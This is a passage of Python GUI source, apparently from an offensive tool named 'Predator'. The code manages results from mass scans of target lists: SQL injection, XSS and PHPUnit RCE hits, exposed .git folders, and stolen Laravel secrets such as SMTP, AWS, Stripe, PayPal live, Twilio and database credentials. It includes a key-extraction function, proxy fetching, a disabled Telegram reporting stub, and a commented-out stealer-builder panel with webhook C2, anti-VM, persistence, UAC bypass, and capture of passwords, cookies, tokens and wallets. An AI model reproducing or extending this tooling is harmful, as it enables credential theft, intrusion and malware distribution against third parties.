                with open('Result/Laravel/xgate.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def get_aimon(self, source):
        source = str(source).split('\n')
        out = ''
        for s in source:
            x = str(s).split('=')[0]
            if 'aimon_' in str(x).lower():
                if 'xxx' not in str(s).split('=')[1] and '***' not in str(s).split('=')[1]:
                    if str(s) not in str(out) and str(s).split('=')[1] not in str(out) and str(x).replace(' ','') not in str(s).split('=')[1]:
                        out += s + '\n'
        if 'aimon' in str(out).lower():
            try:
                with open('Result/Laravel/aimon.txt', 'a', encoding="utf-8") as f:
                    f.write(f'{out}\n')
            except:
                pass

    def updateProgress(self):
        global inScopeTargets
        global startNum
        global totalInBegin

        startNum += 1

        done = startNum / totalInBegin
        avg_speed = startNum / ((perf_counter() - self.start_time))
        # cur_speed = chunk_size / (perf_counter() - self.time_at_start_of_chunk)
        time_left = (totalInBegin - startNum) / avg_speed

        minutes, seconds = divmod(int(time_left), 60)
        hours, minutes = divmod(minutes, 60)
        time_left_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.eta_label.configure(text=f"Time Left: {time_left_str}")

        self.progress_bar.set(done)
        self.percentage_complete.configure(text=f"{str(done*100).split('.')[0]}%")

    def stop_scan(self):
        global gstop

        gstop = 'true'

        xtext = "stop scan in progress..."
        consolelog("INFO", xtext)
        self.start_button.configure(state="disabled")

    def rm_dup(self, path, outpath):
        input = open(path, 'rb')
        output = open(outpath, 'wb')
        
        for key,  group in itertools.groupby(sorted(input)):
            output.write(key)
        
        self.auto_function()

    def rm_duplicate(self, path, outpath):
        xtext = f'Removing Duplicates from "{path}" in Progress...'
        consolelog("INFO", xtext)
        self.rm_dup(path, outpath)  
        os.remove(path)
        shutil.move(outpath, path)

    def remove_blacklist(self, path, tmp):
        global totalrm
        
        blacklist_sites = []

        #return show_info('Soon', 'under construction...')
        self.res_app.title('Please wait...')
        
        try:
            with open('core/txt/Blacklist.txt', 'r', encoding='utf-8') as f:
                for xsite in f:
                    xsite2 = xsite.replace('\n', '')
                    if len(xsite2) > 1:
                        blacklist_sites.append(xsite2)

        except Exception as err:
            consolelog('ERROR', err)
    

        try:
            with open(path, encoding="utf-8") as oldfile, open(tmp, 'w', encoding="utf-8") as newfile:
                for line in oldfile:
                    if not any(bad_word in line for bad_word in blacklist_sites):
                        newfile.write(line)
                    else:
                        totalrm += 1
                        
            os.remove(path)
            shutil.move(tmp, path)    

        except Exception as err:
            consolelog('ERROR', err)
  
        self.res_app.attributes("-topmost", False)
        self.show_info('Success', f'{totalrm} Removed from "{path}"')
        
        xtext = f'{totalrm} has Removed from "{path}"'
        consolelog("INFO", xtext)

        self.auto_function()
        totalrm = 0

        self.res_app.destroy()
        
        self.GetResult(path)

    def Exprt_Data(self):
        Exp_res = self.ResTextBox.get("0.0", "end")
    
        filename = filedialog.asksaveasfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
                
        if str(filename) == "None":
            return
        
        with open(filename, 'w', encoding='utf-8') as fh:
            fh.write(Exp_res)
        
        self.auto_function()
        self.res_app.attributes("-topmost", False)
        return self.show_checkmark('Success', 'Exported Successfully.')    

    def GetResult(self, path):       
        def rb_trigger():
            self.res_app.configure(state="disabled")
            tx3 = threading.Thread(target=self.remove_blacklist, args=(path, 'tmp/data_tmp.txt'))
            tx3.daemon = True
            tx3.start()
            #remove_blacklist(path, 'tmp/data_tmp.txt')
         
        def rd_trigger():
            self.rm_duplicate(path, 'tmp/data_tmp.txt')
            self.res_app.attributes("-topmost", False)
            self.show_info('Success', 'Duplicate Removed Successfully.')
            self.auto_function()

            xtext = "Duplicate Removed Successfully."
            consolelog("INFO", xtext)

            self.res_app.destroy()

            return self.GetResult(path)

        def rhttp_trigger():
            usrresp = self.dialog_event('Remove From List', 'Remove from List:')
            
            if usrresp != "Cancel":
                try:

                    self.r_line_func(path, usrresp, '')
                    self.res_app.attributes("-topmost", False)
                    self.show_info('Success', f'{usrresp} has removed successfully')

                    # auto_function()
                    tx = threading.Thread(target=self.auto_function)
                    tx.daemon = True
                    tx.start()

                    self.res_app.destroy()

                    return self.GetResult(path)

                except Exception as err:
                    return consolelog('ERROR', err)

        def remove_ips():
            with open(path, encoding='utf-8') as oldfile, open('ipstmp.txt', 'w', encoding='utf-8') as newfile:
                for line in oldfile:
                    reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
                    if re.match(reg, line):
                        isip = True
                    else:
                        newfile.write(line)
                
            os.remove(path)
            shutil.move('ipstmp.txt', path)

        def remvips():
            self.remove_ips()
            self.res_app.attributes("-topmost", False)
            self.show_info('Success', 'IPs has removed successfully')
            self.auto_function()

            self.res_app.destroy()

            return self.GetResult(path)

        def SaveResult():
            text2 = self.ResTextBox.get("0.0", "end")

            with open(path, "w", encoding='utf-8') as f:
                f.write(text2)

            self.res_app.attributes("-topmost", False)
            self.show_checkmark('Success', 'Saved Successfully.')
            self.auto_function()
            self.res_app.destroy()
            return self.GetResult(path)

        try:
            with open(path, 'r', encoding='utf-8') as file:
                text = file.read()
                    
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog("WARNING", err)
             
        if path == 'core/txt/targets.txt':
            tota = self.Count_lines(path)
            title = f'InScope Targets > {tota}'

        elif path == 'Result/SQL.txt':
            tota = self.Count_lines(path)
            title = f'SQL Result > {tota}'

        elif path == 'Result/XSS.txt':
            tota = self.Count_lines(path)
            title = f'XSS Result > {tota}'

        elif path == 'Result/Laravel/Config.txt':
            tota = self.Count_lines(path)
            title = f'Configs > {tota}'

        elif path == 'Result/Laravel/PHPUnitRCE.txt':
            tota = self.Count_lines(path)
            title = f'PHPUnitRCE > {tota}'

        elif path == 'Result/Reversed/result.txt':
            tota = self.Count_lines('Result/Reversed/result.txt')
            title = f'Reversed IP > {tota}'

        elif path == 'Result/SubFinder/result.txt':
            tota = self.Count_lines('Result/SubFinder/result.txt')
            title = f'SubFinder > {tota}'
        
        elif path == 'Result/Possible/apikeys.txt':
            sdcount = self.Count_lines('Result/Possible/apikeys.txt')
            title = f'Possible ApiKeys > {sdcount}'

        elif path == 'Result/CORS.txt':
            tota = self.Count_lines('Result/CORS.txt')
            title = f'CORS > {tota}'
        
        elif path == 'Result/Grabber/Laravel.txt':
            tota = self.Count_lines(path)
            title = f'Valid Laravel > {tota}'

        elif path == 'Result/SmtpChecker/result.txt':
            tota = self.Count_lines(path)
            title = f'Valid SMTP > {tota}'

        elif path == 'Result/Grabber/zone-xsec.txt':
            tota = self.Count_lines(path)
            title = f'zone-xsec > {tota}'

        elif path == 'Result/Grabber/hoxor.txt':
            tota = self.Count_lines(path)
            title = f'hoxor.id > {tota}'
        
        elif path == 'Result/Grabber/hypestat.txt':
            tota = self.Count_lines(path)
            title = f'Hypestat > {tota}'

        elif path == 'Result/Laravel/smtp.txt':
            tota = self.Count_lines(path)
            title = f'Leaked SMTP > {tota}'

        elif path == 'Result/.git.txt':
            tota = self.Count_lines(path)
            title = f'Leaked GIT > {tota}'
        
        elif path == 'Result/Laravel/twilio.txt':
            tota = self.Count_lines(path)
            title = f'Leaked Twilio > {tota}'

        elif path == 'Result/Laravel/DBs.txt':
            
            try:
                with open(path, 'r', encoding="utf-8") as f:
                    DBsData = f.read()
            except Exception as err:
                console.print_exception(show_locals=True)
                return self.show_error('Error! x73x', err)

            pattern = r"DB_DATABASE=(.*?)\n"
            results = re.findall(pattern, DBsData)

            tota = 0
            for res in results:
                tota += 1
           
            title = f'Leaked DBs > {tota}'

        elif path == 'Result/Laravel/clicksend.txt':
            
            try:
                with open(path, 'r', encoding="utf-8") as f:
                    CsData = f.read()
            except Exception as err:
                console.print_exception(show_locals=True)
                return self.show_error('Error! x875x', err)

            pattern = r"_KEY=(.*?)\n"
            results = re.findall(pattern, CsData)

            tota = 0
            for res in results:
                tota += 1
           
            title = f'Leaked ClickSend > {tota}'

        elif path == 'Result/Laravel/onesignal.txt':
            
            try:
                with open(path, 'r', encoding="utf-8") as f:
                    OsData = f.read()
            except Exception as err:
                console.print_exception(show_locals=True)
                return self.show_error('Error! x654x', err)

            pattern = r"_KEY=(.*?)\n"
            results = re.findall(pattern, OsData)

            tota = 0
            for res in results:
                tota += 1
           
            title = f'Leaked OneSignal > {tota}'

        elif path == 'Result/Laravel/razorpay.txt':
            
            try:
                with open(path, 'r', encoding="utf-8") as f:
                    RpData = f.read()
            except Exception as err:
                console.print_exception(show_locals=True)
                return self.show_error('Error! x678x', err)

            pattern = r"_KEY=(.*?)\n"
            results = re.findall(pattern, RpData)

            tota = 0
            for res in results:
                tota += 1
           
            title = f'Leaked RazorPay > {tota}'

        elif path == 'Result/Laravel/paypal_sandbox.txt':
            
            try:
                with open(path, 'r', encoding="utf-8") as f:
                    psData = f.read()
            except Exception as err:
                console.print_exception(show_locals=True)
                return self.show_error('Error! x321', err)

            pattern = r"_CLIENT_ID=(.*?)\n"
            results = re.findall(pattern, psData)

            tota = 0
            for res in results:
                tota += 1
           
            title = f'Leaked Paypal Sandbox > {tota}'

        elif path == 'Result/Laravel/sms.txt':
            title = f'Leaked SMS'
        elif path == 'Result/Laravel/stripe.txt':
            title = f'Leaked Stripe'

        elif path == 'Result/Laravel/paypal_live.txt':
            title = f'Leaked Paypal Live'

        elif path == 'Result/Laravel/aws.txt':
            tota = self.Count_lines(path)
            title = f'Leaked AWS > {tota}'

        else:
            tota = self.Count_lines(path)
            title = f'{path} > {tota}'
                                    
        try:
          self.res_app.destroy()
        except:
          pass

        self.res_app = customtkinter.CTkToplevel()
        self.res_app.title(title)
        self.res_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.res_app.wm_iconphoto(False, mainico) 
        self.res_app.geometry("620x340")
        self.res_app.attributes("-topmost", True)
        self.res_app.grid_columnconfigure((0), weight=1)
        self.res_app.grid_rowconfigure((0), weight=1)

        self.ResTextBox = customtkinter.CTkTextbox(self.res_app, corner_radius=0)
        self.ResTextBox.grid(row=0, column=0, sticky="nsew")

        self.rightResFrame = customtkinter.CTkFrame(self.res_app, width=100, corner_radius=0, fg_color="transparent")
        self.rightResFrame.grid(row=0, column=1)
        # self.rightResFrame.grid_rowconfigure((0,1,2,3,4,5,6), weight=1)
        # self.rightResFrame.grid_columnconfigure(0, weight=1)

        ftext = self.get_text_from_file(path)
        if ftext:

            Goodx = False
            try:
                with open(path, 'r', encoding="utf-8") as wlst:
                    xtarg = wlst.read()

                self.ResTextBox.insert("0.0", f'{xtarg}')
                Goodx = True
            except Exception as err:
                consolelog('ERROR', err)

            xLx = self.ResTextBox.get("0.0", "end")
            reCheckx = len(xLx)

            if reCheckx == "" or reCheckx == "\n":
                Goodx = False
            
            if Goodx == False:
                try:
                    with open(path, 'r', encoding="utf-8") as wlst:
                        for line in wlst:

                            if line == '\n':
                                continue

                            self.ResTextBox.insert("0.0", f'{line}')
                
                except Exception as err:
                    return consolelog('ERROR', err)
                    
        else:
            pass

        self.save_button = customtkinter.CTkButton(master=self.rightResFrame, command=SaveResult, text="Save", corner_radius=0)
        self.save_button.pack()

        self.ExPrt_button = customtkinter.CTkButton(master=self.rightResFrame, command=self.Exprt_Data, text="Export", corner_radius=0)
        self.ExPrt_button.pack()

        self.f0_button = customtkinter.CTkButton(master=self.rightResFrame, text="Remove Word", corner_radius=0, command=rhttp_trigger)
        self.f0_button.pack()
        
        self.f2_button = customtkinter.CTkButton(master=self.rightResFrame, text="Remove Duplicate", corner_radius=0, command=rd_trigger)
        self.f2_button.pack()

        self.f3_button = customtkinter.CTkButton(master=self.rightResFrame, text="Remove Blacklist", corner_radius=0, command=rb_trigger)
        self.f3_button.pack()

        self.f4_button = customtkinter.CTkButton(master=self.rightResFrame, text="Remove IPs", corner_radius=0, command=remvips)
        self.f4_button.pack()

        self.close_button = customtkinter.CTkButton(master=self.rightResFrame, text="Close", corner_radius=0, command=self.res_app.destroy)
        self.close_button.pack()

        if path == 'Result/Laravel/DBs.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/twilio.txt':
            self.f0_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/clicksend.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/onesignal.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/sms.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/razorpay.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/paypal_live.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/paypal_sandbox.txt':
            self.f0_button.configure(state="disabled")
            self.f2_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/smtp.txt':
            self.f0_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

        elif path == 'Result/Laravel/aws.txt':
            self.f0_button.configure(state="disabled")
            self.f3_button.configure(state="disabled")
            self.f4_button.configure(state="disabled")

    def auto_function(self):
        global PhpUnitRCE

        try:
            SQLCount = self.Count_lines('Result/SQL.txt')
            XSSCount = self.Count_lines('Result/XSS.txt')
            ConfigCount = self.Count_lines('Result/Laravel/Config.txt')
            laravelRCECount = self.Count_lines('Result/Laravel/PHPUnitRCE.txt')
            KeysCount = self.Count_lines('Result/Possible/apikeys.txt')
            Ored = self.Count_lines('Result/Possible/OpenRedirect.txt')
            CorsCount = self.Count_lines('Result/CORS.txt')
            tCount = self.Count_lines('core/txt/targets.txt')
            gitCount = self.Count_lines('Result/.git.txt')
            com_jceCount = self.Count_lines('Result/com_jce.txt')
        except Exception as err:
            consolelog('ERROR', err)            
        
        try:
            CountText = str(tCount)
            PHPUnitRCECount = "PHPUnitRCE: " + str(laravelRCECount)
            SQLResCount = "SQL: " + str(SQLCount)
            XSSResCount = "XSS: " + str(XSSCount)
            ConfigResCount = "Config: " + str(ConfigCount)
            # KeysResCount = "ApiKeys: " + str(KeysCount)
            # oRedResCount = "OpenRedirect: " + str(Ored)
            CorsResCount = "CORS: " + str(CorsCount)
            GitResCount = "GIT: " + str(gitCount)
            ComJceCount = "com_jce: " + str(com_jceCount)
        except Exception as err:
            console.print_exception(show_locals=True)
            

        def openres_sql():
            return self.GetResult('Result/SQL.txt')

        self.SQL_res.configure(text=SQLResCount, command=openres_sql)

        def openres_git():
            return self.GetResult('Result/.git.txt')

        self.GitConfig_res.configure(text=GitResCount, command=openres_git)

        def openres_xss():
            return self.GetResult('Result/XSS.txt')

        self.XSS_res.configure(text=XSSResCount, command=openres_xss)

        def openres_config():
            return self.GetResult('Result/Laravel/Config.txt')

        self.Config_res.configure(text=ConfigResCount, command=openres_config)

        def openres_phpunitrce():
            return self.GetResult('Result/Laravel/PHPUnitRCE.txt')

        self.PHPUnitRCE_res.configure(text=PHPUnitRCECount, command=openres_phpunitrce)

        def openres_com_jce():
            return self.GetResult('Result/com_jce.txt')

        self.comJce_res.configure(text=ComJceCount, command=openres_com_jce)

        # def openres_Keys():
        #     return self.GetResult('Result/Possible/apikeys.txt')

        # self.Keys_res.configure(text=KeysResCount, command=openres_Keys)

        # def openres_oRed():
        #     return self.GetResult('Result/Possible/OpenRedirect.txt')

        # self.ored_res.configure(text=oRedResCount, command=openres_oRed)

        def openres_Cors():
            return self.GetResult('Result/CORS.txt')

        self.Cors_res.configure(text=CorsResCount, command=openres_Cors)

        def opentargets():
            return self.GetResult('core/txt/targets.txt')
    
        self.TargetsCount.configure(text=CountText, command=opentargets)

    def dialog_event(self, title, txt):
        dialog = customtkinter.CTkInputDialog(text=txt, title=title).get_input()
        return dialog

    def r_line_func(self, path, re, ri):
        fin = open(path, "rt")
        data2 = fin.read()
        data = data2.replace(re, ri)
        fin.close()
        fin = open(path, "wt")
        fin.write(data)
        fin.close()

    

    def get_text_from_file(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                text = file.read()
                return text
        except Exception as err:
            return consolelog('ERROR', err)

    def openlist(self):
        userlist = filedialog.askopenfilename()            
        with open(userlist, 'r', encoding='utf-8') as file:
            text = file.read()

        with open('core/txt/targets.txt', "a", encoding="utf-8") as f:
            f.write(text + '\n')
        
        self.auto_function()

    def show_checkmark(self, tit, msg):
        CTkMessagebox(title=tit, message=msg, icon="check", option_1="Close")

    def show_info(self, tit, msg):
        CTkMessagebox(title=tit, message=msg)  
    
    def show_error(self, tit, msg):
        CTkMessagebox(title=tit, message=msg, icon="cancel") 

    def emojyCallback(self, event):
        hovered = Xchoice(self.hoveredlist)
        reHelpemoji_hovered = self.emoji_img(30, hovered)
        self.reHelpText.configure(image=reHelpemoji_hovered)

    def emoji_img(self, size, text):
        font = ImageFont.truetype("seguiemj.ttf", size=int(round(size*72/96, 0))) 
        # pixels = points * 96 / 72 : 96 is windowsDPI
        im = Image.new("RGBA", (size, size), (255, 255, 255, 0))
        draw = ImageDraw.Draw(im)
        draw.text((size/2, size/2), text, embedded_color=True, font=font, anchor="mm")
        return ImageTk.PhotoImage(im)

    def retrieve(self, widget):
        self.widget.pack(fill="BOTH", expand = True)

    def forget(self, widget):
        self.widget.forget()

    def checkUpdate(self): 
        return    
        try:
            ureq = requests.get(url='https://raw.githubusercontent.com/l4gtr4/Predator/main/version.json').text
            
        except Exception as err:
            consolelog('INFO', err)
            return False
        
        if "version" not in str(ureq):
            return False

        try:
            with open('tmp/update.json', 'w', encoding="utf-8") as f:
                f.write(ureq)
        except Exception as err:
            return False

        try:
            with open('core/settings.json', 'r', encoding='utf-8') as up_data:
                upcheck = json.load(up_data)
                predver = (upcheck['version'])
        except Exception as err:
            return self.show_error('Error! x3x', err)

        try:
            with open('tmp/update.json', 'r', encoding='utf-8') as tmpver_data:
                upver = json.load(tmpver_data)
                predcver = (upver['version'])
                dowlink = (upver['link'])
        except Exception as err:
            return self.show_error('Error! x998x', err)

        if predver == predcver:
            return False
        else:
            
            time.sleep(7)
            upmsg = CTkMessagebox(title="Update", message=f"v{predcver} Available", icon="info", option_1="ignore", option_2="Download")
            upresponse = upmsg.get()
            
            if upresponse=="Download":
                try:
                    webbrowser.open(dowlink, new=0, autoraise=True)
                except Exception as err:
                    consolelog('ERROR', err)
                    return self.show_error('Error! x4x4', err)

        try:
            os.remove('tmp/update.json')
        except:
            pass

    def settings_db(self, method, var, save_var):
        if method == 'get':
            try:
                with open('core/settings.json', 'r', encoding='utf-8') as settings_data:
                    sdb = json.load(settings_data)
                    x_var = (sdb[var])
                    return x_var

            except Exception as err:
                print(err)
                return 5
            
        if method == 'post':
            try:
                with open('core/settings.json', 'r', encoding='utf-8') as settings_data:
                    sdb = json.load(settings_data)
                
                sdb[var] = save_var
                
                with open("core/settings.json", "w", encoding='utf-8') as fixone:
                    json.dump(sdb, fixone)

                return True

            except Exception as err:
                return self.show_error('Error!', err)

    def Notif(self, text):
        check = self.settings_db('get', 'notifications', '')

        if check == "on":
            notification.notify(title = "BOOYAH!", app_icon="core/logo.ico", message=f"🤗{text}", timeout=10)

    def HitSound(self):
        try:
            check = self.settings_db('get', 'sound', '')

            if check == "on":
                soundplay("core/Sounds/hit.wav")

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

    def get_proxies(self, endpoint):
        try:
            response = requests.get(endpoint, timeout=10).text
        except Exception as err:
            return consolelog('INFO', err)
            
        if any(char.isalpha() for char in response):
            pass
        else:
            for line in response:
                line = line.replace('\n', '')
                with open('tmp/http.txt', 'a', encoding="utf-8") as f:
                    f.write(line)

    def send_to_telegram(self, message):
        return
        # username = os.getenv('username')
        # messagex = f"🦁v0.0.8 [{username}]\n{message}"

        # apiToken = '6630144116:AAFA56quARhvmkFLBMSTNad3-RyXXXX'
        # chatID = '5143XXXX'

        # apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'
        
        # try:
        #     sendit = requests.post(apiURL, json={'chat_id': chatID, 'text': messagex, 'parse_mode': 'html'})
        # except:
        #     pass

    def Count_lines(self, path):
        line_count = 0
        try:
            if os.stat(path).st_size == 0:
                line_count = 0
                return line_count

            with open(path, 'r', encoding='utf-8') as file:
                for line in file:
                    if len(line) > 1:
                        line_count += 1
              
            return line_count 
                
        except Exception as err:
            consolelog('WARNING', err)

            with open(path, 'w', encoding="utf-8") as f:
                f.write("")

            return 0 

    def change_appearance_mode_event(self, new_appearance_mode: str):
        customtkinter.set_appearance_mode(new_appearance_mode)

    def change_scaling_event(self, new_scaling: str):
        new_scaling_float = int(new_scaling.replace("%", "")) / 100
        customtkinter.set_widget_scaling(new_scaling_float)

class Settings:
    UpdatesCheck = False
    Password = "Predator123"

class Utility:
    @staticmethod
    def ToggleConsole(choice: bool) -> None:
        if choice:
            # Show Console
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
        else:
            # Hide Console
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def IsAdmin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except Exception:
            return False
        
    @staticmethod
    def GetSelfDir() -> str:
        return os.path.dirname(__file__)
    
    @staticmethod
    def CheckInternetConnection() -> bool:
        try:
            create_connection(("www.google.com", 80), timeout= 3.0)
            return True
        except Exception:
            return False

# class BuilderOptionsFrame(customtkinter.CTkFrame):

#     def __init__(self, master) -> None:
#         super().__init__(master, fg_color= "transparent")

#         # self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
#         # self.pumpLimit = 0 # Bytes

#         self.grid_propagate(False)

#         # self.font = customtkinter.CTkFont(size= 20)

#         # self.pingMeVar = customtkinter.BooleanVar(self)
#         # self.vmProtectVar = customtkinter.BooleanVar(self)
#         # self.startupVar = customtkinter.BooleanVar(self)
#         # self.meltVar = customtkinter.BooleanVar(self)
#         # self.fakeErrorVar = customtkinter.BooleanVar(self)
#         # self.blockAvSitesVar = customtkinter.BooleanVar(self)
#         # self.discordInjectionVar = customtkinter.BooleanVar(self)
#         # self.uacBypassVar = customtkinter.BooleanVar(self)
#         # self.pumpStubVar = customtkinter.BooleanVar(self)

#         # self.captureWebcamVar = customtkinter.BooleanVar(self)
#         # self.capturePasswordsVar = customtkinter.BooleanVar(self)
#         # self.captureCookiesVar = customtkinter.BooleanVar(self)
#         # self.captureHistoryVar = customtkinter.BooleanVar(self)
#         # self.captureAutofillsVar = customtkinter.BooleanVar(self)
#         # self.captureDiscordTokensVar = customtkinter.BooleanVar(self)
#         # self.captureGamesVar = customtkinter.BooleanVar(self)
#         # self.captureWifiPasswordsVar = customtkinter.BooleanVar(self)
#         # self.captureSystemInfoVar = customtkinter.BooleanVar(self)
#         # self.captureScreenshotVar = customtkinter.BooleanVar(self)
#         # self.captureTelegramVar = customtkinter.BooleanVar(self)
#         # self.captureCommonFilesVar = customtkinter.BooleanVar(self)
#         # self.captureWalletsVar = customtkinter.BooleanVar(self)
        
#         # self.boundExePath = ""
#         # self.boundExeRunOnStartup = False
#         # self.iconBytes = ""

#         # self.OutputAsExe = True
#         # self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
#         # self.C2Mode = 1 # 0 = Discord, 1 = Telegram

#         self.rowconfigure(1, weight=0)
#         self.columnconfigure(0, weight=1)

#         # Controls 
#         self.C2EntryName = customtkinter.CTkLabel(master=self, text="Webhook", font=customtkinter.CTkFont(size=16, weight="bold"), text_color="red")
#         self.C2EntryName.grid(row=0, column=0)

#         self.C2EntryControl = customtkinter.CTkEntry(self, width=420, placeholder_text="Enter Discord Webhook URL")
#         self.C2EntryControl.grid(row=1, column=0, sticky="nsew")

#         self.testC2ButtonControl = customtkinter.CTkButton(self, text="Test", command=lambda: Thread(target= self.testC2ButtonControl_Callback).start())
#         self.testC2ButtonControl.grid(row=1, column=1, sticky="nsew", padx=5)
        
#         # self.C2EntryControl = customtkinter.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
#         # self.C2EntryControl.grid(row=0, column=0, sticky= "ew", padx= (15, 5), columnspan= 5)

#         # self.testC2ButtonControl = customtkinter.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
#         # self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
        
#         # self.pingMeCheckboxControl = customtkinter.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.pingMeVar)
#         # self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 20)

#         # self.vmProtectCheckboxControl = customtkinter.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.vmProtectVar)
#         # self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 20)

#         # self.startupCheckboxControl = customtkinter.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.startupVar)
#         # self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 20)

#         # self.meltCheckboxControl = customtkinter.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar)
#         # self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)

#         # self.pumpStubCheckboxControl = customtkinter.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
#         # self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)

#         # self.captureWebcamCheckboxControl = customtkinter.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWebcamVar)
#         # self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 20)

#         # self.capturePasswordsCheckboxControl = customtkinter.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.capturePasswordsVar)
#         # self.capturePasswordsCheckboxControl.grid(row= 2, column= 1, sticky= "w", padx= 20)

#         # self.captureCookiesCheckboxControl = customtkinter.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCookiesVar)
#         # self.captureCookiesCheckboxControl.grid(row= 3, column= 1, sticky= "w", padx= 20)

#         # self.captureHistoryCheckboxControl = customtkinter.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureHistoryVar)
#         # self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)

#         # self.captureHistoryCheckboxControl = customtkinter.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureAutofillsVar)
#         # self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)

#         # self.captureDiscordTokensCheckboxControl = customtkinter.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
#         # self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)

#         # self.captureGamesCheckboxControl = customtkinter.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureGamesVar)
#         # self.captureGamesCheckboxControl.grid(row= 2, column= 2, sticky= "w", padx= 20)

#         # self.captureWalletsCheckboxControl = customtkinter.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWalletsVar)
#         # self.captureWalletsCheckboxControl.grid(row= 3, column= 2, sticky= "w", padx= 20)

#         # self.captureWifiPasswordsCheckboxControl = customtkinter.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWifiPasswordsVar)
#         # self.captureWifiPasswordsCheckboxControl.grid(row= 4, column= 2, sticky= "w", padx= 20)

#         # self.captureSysteminfoCheckboxControl = customtkinter.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureSystemInfoVar)
#         # self.captureSysteminfoCheckboxControl.grid(row= 1, column= 3, sticky= "w", padx= 20)

